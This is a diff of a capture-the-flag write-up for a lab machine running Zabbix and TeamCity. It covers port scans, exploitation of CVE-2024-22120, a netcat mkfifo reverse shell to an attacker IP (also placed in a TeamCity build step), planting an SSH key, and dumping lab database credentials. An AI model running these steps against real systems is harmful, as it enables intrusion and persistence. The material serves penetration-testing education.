@@ -12,7 +12,16 @@ tags:
   - CMS-zabbix-RCE
   - Linux-Privilege-Escalation-Zabbix-dateleak
   - Linux-Privilege-Escalation-teamcity
-lastmod: 2026-04-03T17:45:08.118Z
+  - Nmap-Analyzing
+  - Port43037-Java-Remote-Invocation-RMI-Pentest
+  - Port53-DNS-redirct-web-link
+  - BruteForce-subdomain-ffuf
+  - BruteForce-Web-Directory-Feroxbuster
+  - revshell-python-upgrade
+  - Linux-Enumation-Apache-sentive-data
+  - Port22-SSH-tunnel
+  - CMS-Teamcity-Access-via-Database-Manipulation
+lastmod: 2026-05-06T06:07:37.194Z
 ---
 # Box Info
 
@@ -24,9 +33,11 @@ lastmod: 2026-04-03T17:45:08.118Z
 
 ### PORT & IP SCAN
 
-The `nmap`  Scan is fast within 3 min , and which is the Linux machine by Ubuntu .
+{{< toggle "Tag 🏷️" >}}
 
-The Apache httpd 2.4.52 will redirect to another page , it may accept other request method
+{{< tag "Nmap-Analyzing" >}} The target 10.129.234.163 is a Ubuntu Linux server exposing four ports: 22/tcp running OpenSSH 8.9p1, 80/tcp running Apache httpd 2.4.52 that redirects to http://watcher.vl/, 10050/tcp (tcpwrapped, most likely Zabbix agent), and 43047/tcp running a Java RMI service. The host appears to be the Watcher server within the baby2.vl domain, offering remote access via SSH, a web interface, monitoring capabilities, and a Java remote method invocation endpoint.
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -53,13 +64,21 @@ Service detection performed. Please report any incorrect results at https://nmap
                                                                                       
 ```
 
-The port of 10050 and 10050 , the nmap shows that is tcpwrapped , The service is running, but the connection was dropped , so i will check it at the end
-
-but i will check the port of `43047` first due to that is not too hard to find any exploit in there , after that i will back to http 80
-
 ### Java RMI
 
-https://hacktricks.wiki/en/network-services-pentesting/1099-pentesting-java-rmi.html?highlight=RMI#rmi-**components**
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port43037-Java-Remote-Invocation-RMI-Pentest" >}} List Java RMI objects and methods to look for deserialization vulnerabilities or insecure methods that enable remote code execution.
+
+{{< /toggle >}}
+
+#### Background
+
+Java Remote Method Invocation (RMI) is a Java API that enables objects running in one Java Virtual Machine (JVM) to invoke methods on objects in another JVM, often on a different physical system, facilitating distributed computing. It uses a client-server stub model, where stubs handle communication, and RMI Registry manages naming.
+
+Ref : https://hacktricks.wiki/en/network-services-pentesting/1099-pentesting-java-rmi.html?highlight=RMI#rmi-**components**
+
+Tool Preparation
 
 ```
 $ sudo apt install maven -y
@@ -68,9 +87,14 @@ $ cd remote-method-guesser
 $ mvn package
 ```
 
+Initial Enumeration (Guess Mode)
+
 ```
-java -jar target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
+──(parallels㉿kali-linux-2025-2)-[~/Desktop/remote-method-guesser]
+└─$ java -jar target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
 ```
+
+Result Analysis
 
 ```
 ──(parallels㉿kali-linux-2025-2)-[~/Desktop/remote-method-guesser]
@@ -81,23 +105,17 @@ java -jar target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
 
 ```
 
-ok , next one
+* No RMI Registry is bound on the default naming service.
+* This means no remote objects are currently listed or accessible via standard registry lookup.
+* The RMI service is running, but it may be using a custom port setup, direct stub access, or the registry is not exposed.
 
 ### Watcher.vl
 
-{{< tech-stack >}}
+{{< toggle "Tag 🏷️" >}}
 
-OS: Ubuntu Linux\
-Web Server: Apache/2.4.52\
-Language: PHP 8.1\
-Database: MySQL 8.0\
-Application: Zabbix
+{{< tag "Port53-DNS-redirct-web-link" >}} While browser the direct link of http://10.129.234.163 which will redirect to http://watcher.vl/ , but need to add the domain name into the /etc/hosts for successfully previewing.
 
-{{< /tech-stack >}}
-
-when i go to the http://10.129.234.163 , it will redirect to http://watcher.vl/
-
-Therefore , i will add the watcher.vl into the /etc/hosts
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -112,11 +130,25 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-after added , the website will be success loaded
+After added , the website will be success loaded
 
 ![Pasted image 20260323230943.png](/ob/Pasted%20image%2020260323230943.png)
 
-before to do the next , i will like to increase the attack area , like to do the subdomain brute-force to see there are any other subdomain in here
+{{< tech-stack >}}
+
+OS: Ubuntu Linux\
+Web Server: Apache/2.4.52\
+Language: PHP 8.1\
+Database: MySQL 8.0\
+Application: Zabbix
+
+{{< /tech-stack >}}
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "BruteForce-subdomain-ffuf" >}} Given the use of some kind of host-based routing on the webserver, I’ll use `ffuf` to brute force for any subdomains of `watcher.vl` that respond differently than the default case:
+
+{{< /toggle >}}
 
 ```
 ──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -148,11 +180,51 @@ zabbix                  [Status: 200, Size: 3946, Words: 199, Lines: 33, Duratio
 
 ```
 
-add into /etc/hosts
+It finds one! I’ll add both to my `/etc/hosts` file:
 
 ```
 10.129.234.163  watcher.vl zabbix.watcher.vl
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "BruteForce-Web-Directory-Feroxbuster" >}} The 404 page is just the default Apache 404 ,and the main page loads as index.html, suggesting a static site I’ll run feroxbuster against the site, and include `-x html` as the site uses static pages:
+
+{{< /toggle >}}
+
+```
+──(parallels㉿kali-linux-2025-2)-[~/Desktop]
+└─$feroxbuster -u http://watcher.vl -x html
+                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://watcher.vl
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      157l      389w     4991c http://watcher.vl/
+200      GET      157l      389w     4991c http://watcher.vl/index.html
+[####################] - 32s    30000/30000   0s      found:2       errors:0      
+[####################] - 31s    30000/30000   957/s   http://watcher.vl/
+
+```
+
+Nothing .
 
 ### zabbix.watcher.vl
 
@@ -162,29 +234,13 @@ add into /etc/hosts
 
 {{< /toggle >}}
 
+This has potential here. [The Zabbix ticket for this vuln](https://support.zabbix.com/browse/ZBX-24505) specifically calls out that it can lead to RCE, that 7.0.0alpha1 is vulnerable, and gives the steps to exploit.
+
 ![Pasted image 20260323231656.png](/ob/Pasted%20image%2020260323231656.png)
-
-I noted that there is the option for `sign in as guest`
-
-#### Tech stack
-
-The HTTP response headers
-
-{{< code >}}
-
-OS: Ubuntu Linux\
-Web Server: Apache/2.4.52\
-Language: PHP 8.1\
-Database: MySQL 8.0\
-Application: Zabbix
-
-{{< /code >}}
 
 # Shell as Zabbix
 
 I noted that there is the option for `sign in as guest`
-
-***
 
 ![Pasted image 20260327132323.png](/ob/Pasted%20image%2020260327132323.png)
 
@@ -192,9 +248,17 @@ CMS Server is Zabbix 7.0.0alpha1
 
 ![Pasted image 20260327132445.png](/ob/Pasted%20image%2020260327132445.png)
 
+The first step is to make sure I have access to at least one host. Under Monitoring –> Hosts there’s one entry:
+
+I need to be able to run a command on it. Clicking pops a menu:
+
 ![Pasted image 20260327135251.png](/ob/Pasted%20image%2020260327135251.png)
 
+“Ping” works (and shows it’s the same host running Zabbix):
+
 ![Pasted image 20260327140040.png](/ob/Pasted%20image%2020260327140040.png)
+
+I need to get the “sessionid” from the `zbx_session` cookie. It’s just base64-encoded:
 
 Extract any hostid available to this user (open Monitoring->Hosts, host id will be in response)
 
@@ -365,7 +429,7 @@ uv add --script zabbix_server_time_based_blind_sqli.py pwntools
 ### shell
 
 ```
-➜  CVE-2024-22120-RCE git:(main) python CVE-2024-22120-RCE.py --ip zabbix.watcher.vl   --sid e85607b598e315b362b7e06ce22126e6 --hostid 10084
+➜  CVE-2024-22120-RCE git:(main) python CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid e85607b598e315b362b7e06ce22126e6 --hostid 10084
 (!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
 [zabbix_cmd]>>:  whoami 
 zabbix
@@ -441,13 +505,17 @@ var
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Linux-Privilege-Escalation-Zabbix-dateleak" >}} Discovering the Zabbix 's /usr/share/zabbix/conf/zabbix.conf.php , will has the sensitive data , like the database password
+{{< tag "Linux-Privilege-Escalation-Zabbix-dataleak" >}} Discovering the Zabbix 's /usr/share/zabbix/conf/zabbix.conf.php , will has the sensitive data , like the database password
 
 {{< /toggle >}}
+
+To get a real shell, I’ll give this script a bash reverse shell:
 
 ```
 [zabbix_cmd]>>:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f
 ```
+
+This hangs, but at `nc`:
 
 ```
 ➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
@@ -457,28 +525,35 @@ sh: 0: can't access tty; job control turned off
 $ 
 ```
 
-do the standard python upgrade
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "revshell-python-upgrade" >}} I’ll upgrade my shell using the python standard python upgrade .
+
+{{< /toggle >}}
 
 ```
-
 ➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
 listening on [any] 80 ...
 connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 42740
 sh: 0: can't access tty; job control turned off
+
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 zabbix@watcher:/$ ^Z
+
 [1]  + 29702 suspended  sudo nc -lvnp 80
 ➜  CVE-2024-22120-RCE git:(main) ✗ stty raw -echo;fg
 [1]  + 29702 continued  sudo nc -lvnp 80
-                                        export TERM=xterm
+
+export TERM=xterm
+                                        
 zabbix@watcher:/$ id
 uid=115(zabbix) gid=122(zabbix) groups=122(zabbix)
 zabbix@watcher:/$ 
 
-
 ```
 
-in the zabbix home
+That matches users with shells set in `passwd`:
 
 ```
 zabbix@watcher:/home$ cat /etc/passwd | grep 'sh$'
@@ -487,89 +562,11 @@ ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 zabbix@watcher:/home$ 
 ```
 
-```
-➜  CVE-2024-22120-RCE git:(main) ✗ sudo python3 -m http.server 8081
-Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+{{< toggle "Tag 🏷️" >}}
 
+{{< tag "Linux-Enumation-Apache-sentive-data" >}} The Apache config shows three servers: These handle the rewrite to `watcher.vl`, and getting Zabbix to it’s site. The main site is in `/var/www/html`, and it’s just a single HTML page: found the sentive data of mysql database password
 
-➜  CVE-2024-22120-RCE git:(main) ✗ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
---2026-03-28 01:30:31--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
-Resolving github.com (github.com)... 20.205.243.166
-Connecting to github.com (github.com)|20.205.243.166|:443... connected.
-
-```
-
-```
-zabbix@watcher:/etc$ ls
-ls
-PackageKit                     inputrc                 pollinate
-X11                            iproute2                ppp
-acpi                           iscsi                   profile
-adduser.conf                   issue                   profile.d
-alternatives                   issue.net               protocols
-apache2                        java-11-openjdk         python3
-apparmor                       kernel                  python3.10
-apparmor.d                     kernel-img.conf         rc0.d
-apport                         landscape               rc1.d
-apt                            laurel                  rc2.d
-audit                          ld.so.cache             rc3.d
-bash.bashrc                    ld.so.conf              rc4.d
-bash_completion                ld.so.conf.d            rc5.d
-bash_completion.d              ldap                    rc6.d
-bindresvport.blacklist         legal                   rcS.d
-binfmt.d                       libaudit.conf           resolv.conf
-byobu                          libblockdev             rmt
-ca-certificates                libnl-3                 rpc
-ca-certificates.conf           locale.alias            rsyslog.conf
-ca-certificates.conf.dpkg-old  locale.gen              rsyslog.d
-chrony                         localtime               screenrc
-cloud                          logcheck                security
-console-setup                  login.defs              selinux
-cron.d                         logrotate.conf          sensors.d
-cron.daily                     logrotate.d             sensors3.conf
-cron.hourly                    lsb-release             services
-cron.monthly                   lvm                     shadow
-cron.weekly                    machine-id              shadow-
-crontab                        magic                   shells
-cryptsetup-initramfs           magic.mime              skel
-crypttab                       mailcap                 snmp
-dbus-1                         mailcap.order           sos
-debconf.conf                   manpath.config          ssh
-debian_version                 mdadm                   ssl
-default                        mecabrc                 subgid
-deluser.conf                   mime.types              subgid-
-depmod.d                       mke2fs.conf             subuid
-dhcp                           modprobe.d              subuid-
-dpkg                           modules                 sudo.conf
-e2scrub.conf                   modules-load.d          sudo_logsrvd.conf
-ec2_version                    mtab                    sudoers
-emacs                          multipath               sudoers.d
-environment                    multipath.conf          sysctl.conf
-ethertypes                     mysql                   sysctl.d
-fonts                          nanorc                  systemd
-fstab                          needrestart             terminfo
-fuse.conf                      netconfig               timezone
-gai.conf                       netplan                 tmpfiles.d
-groff                          network                 ubuntu-advantage
-group                          networkd-dispatcher     ucf.conf
-group-                         networks                udev
-grub.d                         newt                    ufw
-gshadow                        nftables.conf           update-manager
-gshadow-                       nsswitch.conf           update-motd.d
-gss                            opt                     update-notifier
-hdparm.conf                    os-release              usb_modeswitch.conf
-hibagent-config.cfg            overlayroot.conf        usb_modeswitch.d
-hibinit-config.cfg             overlayroot.local.conf  vim
-host.conf                      pam.conf                vmware-tools
-hostname                       pam.d                   vtrgb
-hosts                          passwd                  wgetrc
-hosts.allow                    passwd-                 xattr.conf
-hosts.deny                     perl                    xdg
-init                           php                     zsh_command_not_found
-init.d                         pm
-initramfs-tools                polkit-1
-
-```
+{{< /toggle >}}
 
 ```
 zabbix@watcher:/etc/apache2/sites-available$ ls
@@ -732,6 +729,8 @@ which one is contain the sentive data ?
 gemini , give the answer\
 ![Pasted image 20260328141108.png](/ob/Pasted%20image%2020260328141108.png)
 
+I’ll find the Zabbix config in `/usr/share/zabbix/conf`:
+
 ```
 [zabbix_cmd]>>:  cat /usr/share/zabbix/conf/zabbix.conf.php
 <?php
@@ -792,6 +791,8 @@ $IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;
 
 ```
 
+That has the DB connection info. I’ll connect:
+
 ```
 zabbix@watcher:/usr/share/zabbix/conf$ mysql -h localhost -u zabbix -puIy@YyshSuyW%0_puSqA
 mysql: [Warning] Using a password on the command line interface can be insecure.
@@ -818,6 +819,8 @@ mysql> show databases;
 3 rows in set (0.02 sec
 ```
 
+There are a ton of tables in `zabbix`. I’ll get the users:
+
 ```
 mysql> select * from users;
 +--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
@@ -838,24 +841,9 @@ I can dump these hashes to `hashcat`, but they don’t crack with `rockyou.txt`.
 
 {{< /toggle >}}
 
-{{< mindmap >}}
-
-# Foothold
-
-* zabbix
-  * change database admin password
-    * view the log
-      * Frank 's password
-
-# ss -tlap
-
-* teamcity
-  * login as Frank
-    * RCE
-
-{{< /mindmap >}}
-
 ### ss -tlap
+
+The `netstat` shows an interesting port:
 
 ```
 [zabbix_cmd]>>:  ss -tlap 
@@ -962,6 +950,8 @@ ESTAB      0      0      [::ffff:127.0.0.1]:51970          [::ffff:127.0.0.1]:my
 
 ### curl check
 
+10050 and 10051 are Zabbix. But 9090, 8111, and 8015 are localhost only and interesting. Checking them out, 8111 is [Team City](https://www.jetbrains.com/teamcity/):
+
 ```
 [zabbix_cmd]>>:  curl http://127.0.0.1:8111 -v
 *   Trying 127.0.0.1:8111...
@@ -1034,9 +1024,48 @@ Method GET not implemented (try POST)
 
 ### teamcity
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port22-SSH-tunnel" >}} To browser the linux 's local web page, I’ll create an SSH tunnel to access this in my browser. I’ll create a `.ssh` directory in zabbix’s home directory, and add a public key:
+
+{{< /toggle >}}
+
+```
+zabbix@watcher:/var/lib/zabbix$ mkdir .ssh
+zabbix@watcher:/var/lib/zabbix$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > .ssh/authorized_keys
+zabbix@watcher:/var/lib/zabbix$ chmod 700 .ssh/
+zabbix@watcher:/var/lib/zabbix$ chmod 600 .ssh/authorized_keys 
+```
+
+Now I can SSH, but the zabbix user’s shell in `passwd` is set to `/nologin`:
+
+```
+$ ssh -i ~/keys/ed25519_gen zabbix@watcher.vl
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1039-aws x86_64)
+...[snip]...
+This account is currently not available.
+Connection to watcher.vl closed.
+```
+
+But I can make a tunnel:
+
+```
+➜  ssh -i ~/keys/ed25519_gen zabbix@watcher.vl -N -L 8111:localhost:8111
+```
+
+This just hangs, but visiting `http://localhost:8111` loads TeamCity:
+
 ![Pasted image 20260328145539.png](/ob/Pasted%20image%2020260328145539.png)
 
+The version is 2024.03.3. Not much I can do here without creds.
+
 #### Get Access via Database Manipulation
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "CMS-Teamcity-Access-via-Database-Manipulation" >}} In the control linux machine with owned database to change the TeamCity 's database admin password for login
+
+{{< /toggle >}}
 
 The [Zabbix docs](https://www.zabbix.com/documentation/current/en/manual/web_interface/password_reset) show how to reset the admin password to “zabbix” with a database query:
 
@@ -1116,23 +1145,33 @@ Frank:R%)3S7^Hf4TBobb(gVVs
 
 TeamCity is a CICD build platform, and frank seems to have admin access. I should be able to create a build stage that executes whatever code I want. I’ll click “Create project…”. On the next page, I’ll click “Manually”:
 
+I’ll give it a name:\
 ![Pasted image 20260328150923.png](/ob/Pasted%20image%2020260328150923.png)
 
 ![Pasted image 20260328152141.png](/ob/Pasted%20image%2020260328152141.png)
 
+The next page is general settings, where I’ll click on “Create build configuration”:
+
 ![Pasted image 20260328154330.png](/ob/Pasted%20image%2020260328154330.png)
+
+I’ll give it a name, and click “Create”:
 
 ![Pasted image 20260328154401.png](/ob/Pasted%20image%2020260328154401.png)
 
+The next page asks for a “New VCS Root”:\
 ![Pasted image 20260328154443.png](/ob/Pasted%20image%2020260328154443.png)
 
+I’ll click skip, and on the next page, click “Build Steps” from the side menu:\
 ![Pasted image 20260328154526.png](/ob/Pasted%20image%2020260328154526.png)
 
+This menu has a button to “Add build step”:\
 ![Pasted image 20260328154829.png](/ob/Pasted%20image%2020260328154829.png)
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f
 
 ![Pasted image 20260328155124.png](/ob/Pasted%20image%2020260328155124.png)
+
+On the next menu, I’ll select “Command Line”:
 
 ```
 ➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
